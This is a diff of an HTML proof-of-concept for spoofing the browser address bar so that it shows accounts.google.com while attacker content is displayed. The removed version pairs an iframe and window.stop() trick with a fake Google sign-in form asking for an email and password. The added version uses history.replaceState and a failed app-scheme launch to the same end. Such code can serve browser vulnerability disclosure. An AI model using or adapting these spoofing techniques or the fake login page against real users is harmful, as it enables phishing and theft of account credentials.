@@ -2,55 +2,58 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Address Bar Spoof PoC</title>
+<title>Scheme Spoof PoC (Safe)</title>
 <style>
-    body {
-        margin: 0;
-        font-family: Arial, sans-serif;
-    }
-    iframe {
-        width: 100vw;
-        height: 100vh;
-        border: none;
-    }
-    #fake-ui {
-        position: fixed;
-        top: 0; left: 0;
-        width: 100vw; height: 100vh;
-        background: #fff;
-        display: none;
-        justify-content: center;
-        align-items: center;
-        flex-direction: column;
-    }
-    input {
-        padding: 10px;
-        margin: 10px;
-        width: 250px;
-        border: 1px solid #ccc;
-        border-radius: 4px;
-    }
+  body, html {
+    margin: 0;
+    background: white;
+    font-family: Arial, sans-serif;
+  }
+  #fake {
+    display: none;
+    padding: 30px;
+    text-align: center;
+    font-size: 22px;
+  }
 </style>
 </head>
 <body>
 
-<!-- Step 1: Load the hanging Google port -->
-<iframe id="loader" src="https://accounts.google.com:4444/"></iframe>
-
-<!-- Step 2: Fake Google Login UI -->
-<div id="fake-ui">
-    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="180">
-    <h2>Sign in</h2>
-    <input type="email" placeholder="Email or phone">
-    <input type="password" placeholder="Enter your password">
-</div>
+<h2>Loading…</h2>
 
 <script>
-    // Step 3: Wait 4 seconds so the address bar gets updated
-    setTimeout(() => {
-        window.stop(); // freezes address bar on valid Google domain
-        document.getElementById("fake-ui").style.display = "flex";
-    }, 4000);
+/*
+ STEP 1:
+ Load a legitimate domain in the current tab via history.replaceState
+ This sets the URL bar to the trusted domain.
+*/
+history.replaceState({}, "", "https://accounts.google.com");
+
+/*
+ STEP 2:
+ After a short delay, attempt to launch an uninstalled app scheme.
+ The OS will fail to open it, and the browser will return here.
+*/
+setTimeout(() => {
+    location.href = "zoommtg://join?id=123"; // any non-installed app scheme
+}, 800);
+
+/*
+ STEP 3:
+ When browser returns after scheme launch failure,
+ the URL bar STILL shows the trusted domain,
+ while the page is attacker-controlled.
+*/
+setTimeout(() => {
+    document.body.innerHTML = "";
+    document.write(`
+        <div id="fake">
+            <h2>This is attacker content.</h2>
+            <p>The URL bar above still shows: <b>https://accounts.google.com</b></p>
+        </div>
+    `);
+    document.getElementById("fake").style.display = "block";
+}, 1600);
 </script>
 
 </body>
